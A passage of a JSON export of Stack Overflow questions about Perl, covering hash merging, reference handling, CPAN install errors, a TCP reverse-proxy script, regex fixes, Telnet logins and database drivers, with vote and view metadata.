Class\n\n$class-&gt;do_something();  # class uses loger-&gt;log internally to report errors\n</code></pre>\n\n<p><strong>Class.pm</strong>\n    package Class;</p>\n\n<pre><code>sub new {\n\n    my $self = {};\n    $self-&gt;{log} = shift; # we got logger-&gt;log function, save it for future use\n\n    return bless $self;\n}\n\nsub do_something {\n     my $self = shift;\n\n     open_file or $self-&gt;{log}-&gt;('Cant open file'); # we can use gotten logger in class \n}\n\n\n1;\n</code></pre>\n"},{"tags":["perl","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12583798,"title":"injecting HTTP::Response objects in a WWW::Mechanize instance","body":"<p>what is the proper way of injecting an HTTP::Response (and implicitly or maybe explicitly as well the corresponding HTTP::Request) in a WWW::Mechanize instance, if any?</p>\n\n<p>Basically I want to separate the downloading process so I can use PoCo::Client::HTTP, for example or AnyEvent::HTTP and use a $mech only to query the response and prepare further requests. And I need a way to grab the prepared HTTP::Request, of course.</p>\n"},{"tags":["perl","reference","parameter-passing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12583612,"title":"Perl function: accept hash, array, or scalar as parameter","body":"<p>I have the following sub-routine. </p>\n\n<pre><code> sub Function{\n   my $ref = \\($_[0]);\n   if(ref($ref) eq 'SCALAR'){\n   . . .\n   }\n}\n</code></pre>\n\n<p>I am trying to get it to work such that passing a list, scalar or hash to it, it converts that into a reference and depending upon whether that reference is of type <code>ARRAY</code>, <code>SCALAR</code> or <code>HASH</code>, different actions are performed.</p>\n\n<p>It could be called as </p>\n\n<pre><code>Function(%a)\nFunction($a)\nFunction(@a)\n</code></pre>\n\n<p>How can I make <code>$ref</code> be a reference to whatever is passed to the <code>Function</code>? My current approach isn't working.</p>\n"},{"tags":["perl","unc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":66,"score":-1,"question_id":12583926,"title":"How to make Perl use UNC Paths?","body":"<p>In my Perl script I have this:\n<code>start \\/WAIT $rootpath\\\\MSI\\\\Protection\\\\AVG\\.exe</code>;</p>\n\n<p>It works for installing AVG when the files are on the computer, but I need to change the path of the exe to this:\n\\\\server\\dqa\\$\\MDT\\Staging-DS\\Applications\\Protection\\AVG.exe</p>\n\n<p>The server part can changes so I can't hard code it. I've never done a script that uses whichever server it is connected to so this is new for me.</p>\n\n<p>So any help on what I should add to get</p>\n"},{"tags":["perl","tcp","proxy","http-headers"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12582668,"title":"Perl tcp_proxy for http","body":"<p>Good day! I'm not very good at writing Perl, but there is a terrible need.\nI found a complete solution for the organization as it reverse proxy ...</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\n\nuse IO::Socket::INET;\nuse IO::Select;\n\nmy @allowed_ips = ('all');\nmy $ioset = IO::Select-&gt;new;\nmy %socket_map;\n\nmy $debug = 1;\n\nsub new_conn {\n\n    my ($host, $port) = @_;\n    return IO::Socket::INET-&gt;new(\n        PeerAddr =&gt; $host,\n        PeerPort =&gt; $port\n    ) || die \"Unable to connect to $host:$port: $!\";\n}\n\nsub new_server {\n    my ($host, $port) = @_;\n\n    my $server = IO::Socket::INET-&gt;new(\n        LocalAddr =&gt; $host,\n        LocalPort =&gt; $port,\n        ReuseAddr =&gt; 1,\n        Listen    =&gt; 100\n    ) || die \"Unable to listen on $host:$port: $!\";\n}\n\nsub new_connection {\n    my $server      = shift;\n    my $remote_host = shift;\n    my $remote_port = shift;\n\n    my $client    = $server-&gt;accept;\n    my $client_ip = client_ip($client);\n\n    unless (client_allowed($client)) {\n\n        print \"Connection from $client_ip denied.\\n\" if $debug;\n        $client-&gt;close;\n        return;\n    }\n    print \"Connection from $client_ip accepted.\\n\" if $debug;\n\n    my $remote = new_conn($remote_host, $remote_port);\n    $ioset-&gt;add($client);\n    $ioset-&gt;add($remote);\n\n    $socket_map{$client} = $remote;\n    $socket_map{$remote} = $client;\n}\n\nsub close_connection {\n    my $client = shift;\n\n    my $client_ip = client_ip($client);\n    my $remote    = $socket_map{$client};\n\n    $ioset-&gt;remove($client);\n    $ioset-&gt;remove($remote);\n\n    delete $socket_map{$client};\n    delete $socket_map{$remote};\n\n    $client-&gt;close;\n    $remote-&gt;close;\n\n    print \"Connection from $client_ip closed.\\n\" if $debug;\n}\n\nsub client_ip {\n    my $client = shift;\n\n    return inet_ntoa($client-&gt;sockaddr);\n}\n\nsub client_allowed {\n    my $client = shift;\n\n    my $client_ip = client_ip($client);\n    return grep { $_ eq $client_ip || $_ eq 'all' } @allowed_ips;\n}\n\ndie \"Usage: $0 &lt;local port&gt; &lt;remote_host:remote_port&gt;\" unless @ARGV == 2;\n\nmy $local_port = shift;\nmy ($remote_host, $remote_port) = split ':', shift();\n\n\nprint \"Starting a server on 0.0.0.0:$local_port\\n\";\nmy $server = new_server('0.0.0.0', $local_port);\n$ioset-&gt;add($server);\n\nwhile (1) {\n\n    for my $socket ($ioset-&gt;can_read) {\n\n        if ($socket == $server) {\n\n            new_connection($server, $remote_host, $remote_port);\n        }\n        else {\n\n            next unless exists $socket_map{$socket};\n            my $remote = $socket_map{$socket};\n            my $buffer;\n            my $read = $socket-&gt;sysread($buffer, 4096);\n\n            if ($read) {\n\n                $remote-&gt;syswrite($buffer);\n            }\n            else {\n\n                close_connection($socket);\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Everything works fine, but the web server to which I redirect the client does not see HTTP_X_FORWARDED_FOR and HTTP_X_REAL_IP. The lower the standard modules, the better.\nI would be grateful for your help.</p>\n"},{"tags":["perl","if-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12581245,"title":"Evaluate a condition for an IF statment in Perl","body":"<p>I need to be able to generate a conditional condition in the IF statement.\nThe code should look something like this:</p>\n\n<pre><code>if($filter_by $operator $value) {\n  # do something\n}\n</code></pre>\n\n<p>Which can be for example: column1 > 10\nThat obviously doesn't work.\nI tried doing this:</p>\n\n<pre><code>if(eval \"$filter_by $operator $value\") \n</code></pre>\n\n<p>but it also doesn't work.\nAny ideas?</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12582597,"title":"Perl is a Compiled language. True or False","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5376559/is-perl-a-compiled-or-an-interpreted-programming-language\">Is Perl a compiled or an interpreted programming language?</a>  </p>\n</blockquote>\n\n\n\n<p>As far I know, perl is a compiled language. Few websites<a href=\"http://www.tutorialspoint.com/perl/perl_introduction.htm\" rel=\"nofollow\">Tutorial website for perl</a> on internet say that it is interpreted language. Which one is true? As I read in perl books they claim that the program which we run are compiled and stored as byte-code and it(byte-code) runs the job that we want.</p>\n"},{"tags":["perl","if-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":69,"score":-4,"question_id":12581249,"title":"If loop not working in perl","body":"<p>Please take a look at this script and suggest possible solutions..</p>\n\n<pre><code>my $otext = 'ABCDEABCDEABCDEABCDEABCDE'; \nmy $len   = length($otext);\nprint \"length of string is:\\n\".$len;\n$n = 1;\n\nif ($n == 1) {\n\n    if (substr($otext, -1, 1) eq \"E\") {\n\n        if ($len &gt;= 3) {\n\n            if ($len == 3) {\n\n                $len1 = 2 * $len - 1; \n                $len2 = 3 * $len - 2; \n            }\n            else {\n\n                $len1 = 2*$len-1; \n                $len2 = 3*$len-3;\n            }\n        }\n        else {\n\n             $len1 = 0;\n             $len2 = 0;     \n        }   \n        print \"Length-1 is:\". $len1;\n        print \"Length-2 is:\" .$len2;\n    }\n}\nelse { \n\n    print \"\\n It's else loop \";\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":13,"down_vote_count":0,"view_count":312,"score":13,"question_id":12579160,"title":"Will there be any difference between 42, 42.0, \"42.0\", \"42\"","body":"<p>During the process of testing my Perl code using \"Smart Match(~~)\" I have faced this problem. Will there be any difference between 42, 42.0, \"42.0\", \"42\"</p>\n\n<pre><code>$var1 = \"42\";\n$var2 = \"42.0\";\n$a = $var1 ~~ $var2;\n</code></pre>\n\n<p>I am getting <code>$a</code> as 0; which means <code>$var1</code> and <code>$var2</code> are not equal.</p>\n\n<p>Please Explain.</p>\n"},{"tags":["java","perl","include"],"answer_count":7,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1452,"score":6,"question_id":971215,"title":"Include Perl in Java","body":"<p>Is there any way to execute perl code without having to use Runtime.getRuntime.exec(\"...\"); (parse in java app)?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12578172,"title":"Merging hashes in perl","body":"<p>I am trying to merge two hashes. Well, I am able to merge but the output is not the way i wanted to be : </p>\n\n<p>Here is by code : </p>\n\n<pre><code>my %firend_list = (\n   Raj       =&gt; \"Good friend\",\n   Rohit     =&gt; \"new Fiend\",\n   Sumit     =&gt; \"Best Friend\",\n   Rohini    =&gt; \"Fiend\",\n   Allahabad =&gt; \"UttarPradesh\",\n);\n\nmy %city = (\n    Bangalore =&gt; \"Karnataka\",\n    Indore    =&gt; \"MadhyaPradesh\",\n    Pune      =&gt; \"Maharashtra\",\n    Allahabad =&gt; \"UP\",\n);\n\nmy %friends_place = ();\nmy ($k, $v);\nforeach my $ref (\\%firend_list, \\%city) {\n\n    while (($k,$v) = each (%$ref)) {\n\n        if (exists $ref{$k}) {\n\n            print\"Warning: Key is all ready there\\n\";\n            next;\n        } \n        $friends_place{$k} = $v;\n    }  \n}\n\nwhile (($k,$v) = each (%friends_place)) {\n\n    print \"$k = $v \\n\";\n}  \n</code></pre>\n\n<p>From this o/p is</p>\n\n<pre><code>Raj=Good friend\nIndore=MadhyaPradesh\nRohit=new Fiend\nBangalore=Karnataka\nAllahabad=UttarPradesh\nSumit=Best Friend\nPune=Maharashtra\nRohini =Fiend\n</code></pre>\n\n<p>But I want to print <strong>%firend_list first</strong> followed by <strong>%city</strong>.\nAnother thing which I was trying to do is if is there any duplicate key then it should give me a warning message. But it is not giving me any message as we can see here we have Allahabad in both hash. </p>\n\n<p>Thanks   </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":54,"score":-3,"question_id":12579309,"title":"How to read the value from column","body":"<p>Ineed to read the value of the column (First), the column is already seperated by tab from the below table. How can i do this in perl. Could someone help on this. Below is the table:</p>\n\n<pre><code>                                                         First    Available\nJAB                       Result        Dat Con?         Con?     \n--------                 ------        ---------------   -----   ---------\nSLAL_DEPE                SUCCESS       No                Yes     No\n</code></pre>\n\n<p>Here the First Con is \"Yes\".. I want to read this value. Please share ur knowledge with me.....</p>\n"},{"tags":["linux","perl","ubuntu","cpan"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1496,"score":0,"question_id":6876295,"title":"CPAN giving all sorts of errors on ubuntu","body":"<p>I am just trying to run a simple perl program to import data from xml and export it to database.</p>\n\n<p>Use Mysql; did not work, so I used DBD::mysql instead after failing to get Mysql.pm from cpan.</p>\n\n<p>However, I am unable to install anything. I am trying to install xml parser module, but cpan gives these errors no matter what module you try to install.</p>\n\n<pre><code>install xml::parser\nCPAN: Storable loaded ok (v2.20)\nGoing to read '/root/.cpan/sources/authors/01mailrc.txt.gz'\nCPAN: Compress::Zlib loaded ok (v2.02)\n............................................................................DONE\nGoing to read '/root/.cpan/sources/modules/02packages.details.txt.gz'\nWarning: Your /root/.cpan/sources/modules/02packages.details.txt.gz does not contain a Line-Count header.\nPlease check the validity of the index file by comparing it to more\nthan one CPAN mirror. I'll continue but problems seem likely to\nhappen.\nCPAN: Time::HiRes loaded ok (v1.9719)\nWarning: Your /root/.cpan/sources/modules/02packages.details.txt.gz does not contain a Last-Updated header.\nPlease check the validity of the index file by comparing it to more\nthan one CPAN mirror. I'll continue but problems seem likely to\nhappen.\nDONE\nGoing to read '/root/.cpan/sources/modules/03modlist.data.gz'\nCatching error: \"Can't locate object method \\\"data\\\" via package \\\"CPAN::Modulelist\\\" (perhaps you forgot to load \\\"CPAN::Modulelist\\\"?) at (eval 29) line 1.\\cJ at /usr/share/perl/5.10/CPAN/Index.pm line 518\\cJ\\cICPAN::Index::rd_modlist('CPAN::Index', '/root/.cpan/sources/modules/03modlist.data.gz') called at /usr/share/perl/5.10/CPAN/Index.pm line 85\\cJ\\cICPAN::Index::reload('CPAN::Index') called at /usr/share/perl/5.10/CPAN.pm line 955\\cJ\\cICPAN::exists('CPAN=HASH(0xa225610)', 'CPAN::Module', 'xml::parser') called at /usr/share/perl/5.10/CPAN/Shell.pm line 1243\\cJ\\cICPAN::Shell::expandany('CPAN::Shell', 'xml::parser') called at /usr/share/perl/5.10/CPAN/Shell.pm line 1639\\cJ\\cICPAN::Shell::rematein('CPAN::Shell', 'install', 'xml::parser') called at /usr/share/perl/5.10/CPAN/Shell.pm line 1935\\cJ\\cICPAN::Shell::__ANON__('CPAN::Shell', 'xml::parser') called at /usr/share/perl/5.10/CPAN.pm line 375\\cJ\\cIeval {...} called at /usr/share/perl/5.10/CPAN.pm line 372\\cJ\\cICPAN::shell() called at /usr/bin/cpan line 198\\cJ\" at /usr/share/perl/5.10/CPAN.pm line 391\n    CPAN::shell() called at /usr/bin/cpan line 198\nGoing to read '/root/.cpan/sources/authors/01mailrc.txt.gz'\n............................................................................DONE\nGoing to read '/root/.cpan/sources/modules/02packages.details.txt.gz'\nWarning: Your /root/.cpan/sources/modules/02packages.details.txt.gz does not contain a Line-Count header.\nPlease check the validity of the index file by comparing it to more\nthan one CPAN mirror. I'll continue but problems seem likely to\nhappen.\nWarning: Your /root/.cpan/sources/modules/02packages.details.txt.gz does not contain a Last-Updated header.\nPlease check the validity of the index file by comparing it to more\nthan one CPAN mirror. I'll continue but problems seem likely to\nhappen.\ncpanDONE\nGoing to read '/root/.cpan/sources/modules/03modlist.data.gz'\nNo history written (no histfile specified).\nLockfile removed.\nCan't locate object method \"data\" via package \"CPAN::Modulelist\" (perhaps you forgot to load \"CPAN::Modulelist\"?) at (eval 31) line 1.\n at /usr/share/perl/5.10/CPAN/Index.pm line 518\n    CPAN::Index::rd_modlist('CPAN::Index', '/root/.cpan/sources/modules/03modlist.data.gz') called at /usr/share/perl/5.10/CPAN/Index.pm line 85\n    CPAN::Index::reload('CPAN::Index') called at /usr/share/perl/5.10/CPAN.pm line 692\n    CPAN::all_objects('CPAN=HASH(0xa225610)', 'CPAN::Distribution') called at /usr/share/perl/5.10/CPAN/Shell.pm line 1046\n    CPAN::Shell::failed('CPAN::Shell', 2, 1) called at /usr/share/perl/5.10/CPAN.pm line 413\n    eval {...} called at /usr/share/perl/5.10/CPAN.pm line 413\n  CPAN::shell() called at /usr/bin/cpan line 198\n</code></pre>\n\n<p>Am I doing something wrong? I tried searching for these errors, but no one has a right solution. Is there some setting in the config I should change?</p>\n"},{"tags":["windows","perl","gui"],"answer_count":5,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":269,"score":5,"question_id":12495720,"title":"Perl GUI programming on Windows","body":"<p>I'm looking for tools for Perl GUI programming on Windows for educational/in-house development, mostly science related.</p>\n\n<p>My first choice was PerlQt. A friend of mine was developing with Qt and C++ so I expected getting some help from him. Also Qt has a GUI creator and Linux has nice integration with Perl. \nUnfortunately, I failed to make it work on Windows.\nI searched for other options and am still not clear after search. This is what I've got so far. </p>\n\n<ul>\n<li>Perl/Tk: broad user base, good documentation, relatively low learning\ncurve. But old look and may not be active. Yet some articles say it is rebooted now and has native look.</li>\n<li>wxPerl: native look. But steep learning curve. Not all wx library is ported to Perl. Some like it and some hate it.</li>\n<li>Win32:GUI: native look, can use all Windows API. Needed force install because one of the tests was failed. Still works but not sure it was installed correctly.</li>\n<li>XUL::GUI: using FireFox engine, CSS typing.</li>\n</ul>\n\n<p>I could managed to install them and succeeded to show \"Hello, world\". Yet, I can't decide which one to go and the online information sometimes looks contradict each other.</p>\n\n<p>Would you compare the tools in terms of human efficiency (easy to read and write codes), computational efficiency and the availability of GUI builder?</p>\n"},{"tags":["linux","perl","unix","sed","awk"],"answer_count":15,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":8408,"score":11,"question_id":1654021,"title":"How can I delete a newline if it is the last character in a file?","body":"<p>I have some files that I'd like to delete the last newline if it is the last character in a file.  'od -c' shows me that the command I run does write the file with a trailing new line:</p>\n\n<pre><code>0013600   n   t  &gt;  \\n\n</code></pre>\n\n<p>I've tried a few tricks with sed but the best I could think of isn't doing the trick:</p>\n\n<pre><code>sed -e '$s/\\(.*\\)\\n$/\\1/' abc\n</code></pre>\n\n<p>Any ideas how to do this?</p>\n"},{"tags":["perl","parsing","eval"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12578228,"title":"Getting arrays from userinput","body":"<p>A short question: I want to give users of my script the possibility to enter arbitrary arrays, e.g. <code>\"[1 .. 5]\"</code> or <code>\"[1, 2, 6, 9 .. 20]\"</code>. Currently, I just <code>eval</code> the given string (obviously not very secure!) and <code>perlcritic</code> gives me a Level 5 warning.</p>\n\n<p>My current code:\n</p>\n\n<pre><code>my $arr = eval $patternData{\"arr\"};\nunless ($arr) {\n     # fixes &lt;arr&gt; values like \"(1 .. 5)\"\n     $arr  = undef;\n     @$arr = eval $patternData{\"arr\"};\n}\n</code></pre>\n\n<p>EDIT: As many people are asking: This is a \"the-more-the-better\" thingy. I search a solution both powerful (in terms of expressiveness) and simple (in terms of debugging, parsing and writing input). Also: It absolutely has to support ranges (arrays with well above 100 entries should be entered easily)</p>\n\n<p>and - as always - I forgot to include my version. 5.8 is a must, I'm working with vSphere API, which requires 5.8 (I miss <code>~~</code> so much !)</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>This is perl, v5.8.8 built for MSWin32-x86-multi-thread\n(with 50 registered patches, see perl -V for more detail)\n\nCopyright 1987-2006, Larry Wall\n\nBinary build 820 [274739] provided by ActiveState http://www.ActiveState.com\nBuilt Jan 23 2007 15:57:46\n</code></pre>\n"},{"tags":["regex","perl","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12575299,"title":"Removing special character when regex matched","body":"<p>I have a file like test.l</p>\n\n<pre><code>car ( \"kia\"\nmax speed\nmin speed\nprice \"XXX\"\n)\nbike ( \"R1\"\nmax speed\nmin speed\nprice \"YYY\"\n)\n</code></pre>\n\n<p>I want to remove the quotes in the line having 'price'.\nI have been trying to do that using :</p>\n\n<pre><code>use strict;\n\nopen FILE, \"&lt;&lt;test.l\";\n#open (FILE2,\"&gt;&gt;test.l\");\n\nwhile (my $string = &lt;FILE&gt;) {\n\n    if ($string =~ m/^price/ig) {\n\n        $string =~ s/\\\"//ig;\n        print  FILE $string;\n    }\n}\nclose FILE;\n#close FILE2;\n</code></pre>\n\n<p>Can i overwrite the input file with the modified line when 'price' is encountered???\nThe above code just print the input without any change.</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12577136,"title":"Perl: unable to print long string using format variable and write()","body":"<p>I have the following piece of code which prints a string to console. But when I am passing a large amount of text, it's not printing the complete text. I want to know is there any other alternative way to print text to console and file irrespective of the text or string size?</p>\n\n<p>=> Some Formtated Text =  due to the format issue on the website can't post the sample text</p>\n\n<p>Sample Code :</p>\n\n<pre><code>format LOG_PREVIEW = Some Formatted Text\nformat LOG_STANDARD = Some Formatted Text\n\n    if ($Test::Preview) {\n        $~ = 'LOG_PREVIEW';\n        write();\n    }\n    else {\n        $~ = 'LOG_STANDARD';\n        write();        \n    }\n</code></pre>\n"},{"tags":["perl","short-circuiting"],"answer_count":5,"favorite_count":1,"up_vote_count":13,"down_vote_count":0,"view_count":1889,"score":13,"question_id":1512547,"title":"What is the difference between Perl's ( or, and ) and ( ||, && ) short-circuit operators?","body":"<p>Which of these subroutines is not like the other?</p>\n\n<pre><code>sub or1 {\n    my ($a,$b) = @_;\n    return $a || $b;\n}\n\nsub or2 {\n    my ($a,$b) = @_;\n    $a || $b;\n}\n\nsub or3 {\n    my ($a,$b) = @_;\n    return $a or $b;\n}\n\nsub or4 {\n    my ($a,$b) = @_;\n    $a or $b;\n}\n</code></pre>\n\n<p>I came to Perl 5 from C and Perl 4 and always used <code>||</code> until I saw more scripts using <code>or</code> and I liked the way it looked. But as the above quiz shows, it's not without its pitfalls for the unwary. For people who use both constructs or who use a lot of <code>or</code>, what rules of thumb do you use to decide which construct to use and make sure the code is doing what you think it is doing?</p>\n"},{"tags":["perl","asteriskami"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":11725493,"title":"Fatal error on with Asterisk::AMI","body":"<p>i'm trying to use the Asterisk::AMI package but with a simple example dont works</p>\n\n<pre><code>#!/usr/bin/perl -w\n# ami_test.pl\n\nuse strict;\nuse diagnostics;\nuse Asterisk::AMI;\n\n// use default 127.0.0.1 5038\nmy $astman = Asterisk::AMI-&gt;new(\n    Username =&gt; 'manager',\n    Secret =&gt; 'secret'\n);\n\ndie \"Unable to connect to Asterisk\" unless ($astman);\n\nmy $response = $astman-&gt;({\n    Action =&gt; 'Command',\n    Command =&gt; 'sip show peers'\n});\n\n\nprint $response-&gt;{'Response'};\n</code></pre>\n\n<p>Alway i get an error :</p>\n\n<pre><code>Not a CODE reference at ami_test.pl line 17 (#1)\n    (F) Perl was trying to evaluate a reference to a code value (that is, a\n    subroutine), but found a reference to something else instead.  You can\n    use the ref() function to find out what kind of ref it really was.  See\n    also perlref.\n\nUncaught exception from user code:\n        Not a CODE reference at ami_test.pl line 17.\n at ami_test.pl line 17\n</code></pre>\n\n<hr>\n\n<h2>EDIT</h2>\n\n<p>the documentation see wrong, i've try</p>\n\n<pre><code>my $response = $astman-&gt;action({\n    Action =&gt; 'Command',\n    Command =&gt; 'sip show peers'\n});\n</code></pre>\n\n<p>and works fine</p>\n"},{"tags":["perl","apache","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":49,"score":3,"question_id":12559378,"title":"Apache2 reload config from inside the CGI","body":"<p>I am working on a simple Perl app that copies another Perl app and builds all the required Apache config files.</p>\n\n<p>The thing I can't seem to figure out is how to reload the apache config on the fly. I know I could do a system call and reload apache there, but that would mean I would have to get root access to this app, and that is a little scary.</p>\n\n<p>Is there a way to ask apache to reload its config files from within the CGI container?</p>\n\n<p>-------------------------Additional info------------------------------</p>\n\n<p>I have done some more research and the problem is that Apache must be run with elevated privileges to bind to port 80. So one solution would be to set Apache to run on another port and forward that port to 80 via iptables. (This may be a last resort but a very messy solution).</p>\n\n<p>Here is what gets me, Apache should be able to maintain its current port bindings and recheck its config files, all I am doing is adding another script alias.</p>\n\n<p>Is there any way to add a new script alias with out a reload?</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12574424,"title":"Net::Telnet System engaged error during Telnet when already logged in","body":"<p>This issue might not have a direct solution, but I thought I will give it a shot here.</p>\n\n<p>So I am trying to remotely login to a station using Net::Telnet when someone has already logged in via Telnet to that same station.</p>\n\n<pre><code>use Net::Telnet;\n$telnet = new Net::Telnet ( Timeout=&gt;10, Errmode=&gt;'die');\n$telnet-&gt;open(\"10.42.144.13\");\n$telnet-&gt;login($username,$password);\n$telnet-&gt;cmd(\"whoami\");\n</code></pre>\n\n<p>This above example works if not one else have logged into the same address using Telnet using a different PC. However, if say random user logs into to the above mentioned address, I get this error :</p>\n\n<pre><code>'eof read waiting for login prompt: Sorry, this system is engaged.'\n</code></pre>\n\n<p>What can I do? What options do I have? I cannot prevent somebody from logging into the above address, but whenever I call my script, I would like to login, and run a command.</p>\n"},{"tags":["windows","linux","perl","encoding","port"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12573798,"title":"Windows Perl --> Unix not working after port, possible encoding issue","body":"<p>I've got a Perl program that I wrote on Windows.  It starts with:</p>\n\n<pre><code>$unused_header = &lt;STDIN&gt;;\nmy @header_fields = split('\\|\\^\\|', $unused_header, -1);\n</code></pre>\n\n<p>Which should split input that consists of a very large file of:</p>\n\n<pre><code>The|^|Quick|^|Brown|^|Fox|!|\n</code></pre>\n\n<p>Into:</p>\n\n<pre><code>{The, Quick, Brown, Fox|!|}\n</code></pre>\n\n<p>Note: This line just does the headre alone, theres another one like it to do the repetitive data lines.</p>\n\n<p>It worked great on windows, but on linux it fails.  However, if I define a string with the same contents within Perl, and run the split on that, it works fine.</p>\n\n<p>I think it's a UTF-16 encoding handling issue, but I'm not sure how to handle it.  Does anyone know how I can get perl to understand the UTF-16 being piped into STDIN?</p>\n\n<p>I found: <a href=\"http://www.haboogo.com/matching_patterns/2009/01/utf-16-processing-issue-in-perl.html\" rel=\"nofollow\">http://www.haboogo.com/matching_patterns/2009/01/utf-16-processing-issue-in-perl.html</a> but I'm not sure what to do with it.</p>\n"},{"tags":["regex","perl","validation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":85,"score":-1,"question_id":11927730,"title":"Regular Expression validate URL in perl","body":"<p>I'm trying to finish up my assignment and only last one is to validate the URL</p>\n\n<p>The requirement is as follow:</p>\n\n<p>url only allows alphanumerical characters and the following  :/.~?=+&amp;    No two periods can exist consecutively. </p>\n\n<p>here is what I have so far but it doesn't work</p>\n\n<pre><code>m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\\?([^#]*))?(?:#(.*))?|\n</code></pre>\n\n<p>So what happen now that anything I enter it just pass the matching process that I do which is something like this</p>\n\n<pre><code>$return = $search =~ m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\\?([^#]*))?(?:#(.*))?|;\n</code></pre>\n\n<p>so it always return true for me even I just type nothing in the search box.</p>\n"},{"tags":["perl","oracle","dbi","dbd"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":275,"score":4,"question_id":4449637,"title":"How can I access two Oracle databases with different versions (8i and 9) using perl?","body":"<p>I'm currently accessing an Oracle database version 9i (9.2.0.8.0) using perl modules DBI (1.613) and DBD::Oracle (1.26). The current scope of the project now requires that I access a version 8i (8.1.7.4.0 ) Oracle database and, according to the <a href=\"http://search.cpan.org/~timb/DBD-Oracle-1.26/Oracle.pm\" rel=\"nofollow\">DBD::Oracle project</a>, I can only access this second database with a DBD::Oracle version 1.20 or below.</p>\n\n<p>I know I could possibly use the DBD version 1.20 to access both databases, but I was wondering if its possible to have installed the two versions of the DBD module and use the acceptable version for each database (less prone to errors).</p>\n"},{"tags":["perl","testing","cpan","dist-zilla"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12566945,"title":"Prompt user for options when building a perl module using Dist::Zilla","body":"<p>I have a module I'd like to release to CPAN, and I like using <a href=\"http://dzil.org\" rel=\"nofollow\">dzil</a> to do the packaging and releasing. However, the module relies on an external application, and while I know where it is installed on my machine, I'd like to ask users to input where it is installed on their machine. Having read <a href=\"http://stackoverflow.com/questions/7629363/prompt-user-during-unit-test-in-perl\">Prompt user during unit test in Perl</a> I see ExtUtils::MakeMaker::prompt does just what I want to do.</p>\n\n<p>How would I incorporate that (or something similar) when using dzil?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":65,"score":0,"question_id":12570078,"title":"Perl: Regex matching extra string","body":"<p>I have the following string cases:</p>\n\n<ul>\n<li>my $str = \"Warehouse.13.s01e01.hdtv.xor.avi\";</li>\n<li>my $str = \"Warehouse.13.01x01.hdtv.xor.avi\";</li>\n<li>my $str = \"Warehouse.13.season01episode01.hdtv.xor.avi\";</li>\n</ul>\n\n<p>The delimiter(<code>.</code>) in the above cases can be replaced by <code>_ - \\s</code>. Now to match the above cases I created the following regex and it works fine:</p>\n\n<pre><code>my $regex_object = qr{.*?\\d{1,2}(?:e|edosipe)?[._\\- x]?\\d{1,2}(?:s|nosaes)?[._\\- ]?(?=\\d+)(.*)};\n</code></pre>\n\n<p>You can see I had to reverse the string to handle <code>\\d+</code> because one should have a absolute length match in a look-behind so I converted it to look-ahead.</p>\n\n<p>Now for the above cases the output is <code>Warehouse 13</code> which is my required output.</p>\n\n<p>The problem now is if my <code>series name</code> doesn't contain <code>numbers(13,24)</code> I don't want my above regex to match and to make sure that I used <code>(?=\\d+)</code> i,e if <code>s|season</code> is preceded by number or not.</p>\n\n<p>Now if my <code>$str</code> is <code>'how.i.met.your.mother.s03e13.hdtv.mkv'</code> it matches the above regex and outputs</p>\n\n<pre><code>how.i.met.your.mother.s0\n</code></pre>\n\n<p>Now, I have no idea why it is matching this string even after using a look-behind and how to correct it.</p>\n"},{"tags":["mysql","perl","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12572750,"title":"How to setup CLIENT_MULTI_RESULTS flag in perl dbi for mysql connection","body":"<p>How to set CLIENT_MULTI_RESULTS flag in perl dbi for mysql connection? I have to use a stored procedure with a select query at the end. I learned that to use this kind of procedure, I have to set CLIENT_MULTI_RESULTS flag. Thanks in 